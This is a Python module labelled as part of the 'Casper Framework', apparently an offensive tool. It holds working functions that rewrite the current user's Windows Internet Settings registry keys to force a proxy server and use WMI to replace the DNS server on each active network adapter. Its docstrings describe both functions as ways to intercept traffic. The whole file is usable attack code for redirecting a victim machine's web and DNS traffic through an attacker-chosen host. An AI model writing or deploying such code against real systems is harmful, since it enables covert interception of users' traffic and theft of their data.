'''
Part of Casper Framework
'''
from includes import *

HKEY_key = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
HKEY_create = CreateKey(HKEY_CURRENT_USER,HKEY_key)

def enable_disable_proxy(dword):
	"""
	enable or disable proxy function within registry
	
	dword > 0x00000001 > Enabled
	dword > 0x00000000 > Disabled
	"""
	HKEY_open = OpenKey(HKEY_CURRENT_USER,HKEY_key,0,KEY_ALL_ACCESS)

	try:
		SetValueEx(HKEY_open,"ProxyEnable",0,REG_DWORD,int(dword))
		CloseKey(HKEY_open)
		return True
	except Exception as e:
		return False

def change_proxy(server,dword):
	"""
	intercept using proxy change > change_proxy("127.0.0.1:8080",1)
	"""
	HKEY_open = OpenKey(HKEY_CURRENT_USER,HKEY_key,0,KEY_ALL_ACCESS)
	
	logging.debug("[casper] Attempting to enable or disable proxy support: {}".format(dword))
	if (enable_disable_proxy(int(dword)) == True):
		logging.debug("[casper] Successfully enabled proxy support: {}".format(dword))
		try:
			SetValueEx(HKEY_open,"ProxyServer",0,REG_SZ,server)
			CloseKey(HKEY_open)
			logging.debug("[casper] Successfully added proxy server: {}".format(server))
			return True
		except Exception as e:
			logging.debug("[casper] Error while adding proxy server: {}".format(e))
			return False
	else:
		logging.debug("[casper] Error while enabling proxy support")

def change_dns(server):
	"""
	intercept using dns change > change_dns("8.8.8.8")
	https://msdn.microsoft.com/en-us/library/aa393295(v=vs.85).aspx
	"""
	try:
		for interface in wmi.Win32_NetworkAdapterConfiguration(IPEnabled=True):
			set_dns_server = interface.SetDNSServerSearchOrder([server])
			if (set_dns_server[0] == 0):
				logging.debug("[casper] Successfully added dns server: {}".format(server))
				return True
			elif (set_dns_server[0] == 1):
				logging.debug("[casper] Successfully added dns server: {}".format(server))
				return True
			elif (set_dns_server[0] == 91):
				logging.debug("[casper] Error while adding dns server > Access Denied")
				return False
			else:
				logging.debug("[casper] Error while adding dns server > Unknown error")
				return False
	except Exception as e:
		logging.debug("[casper] Error while adding dns server > Unknown error")
		return False
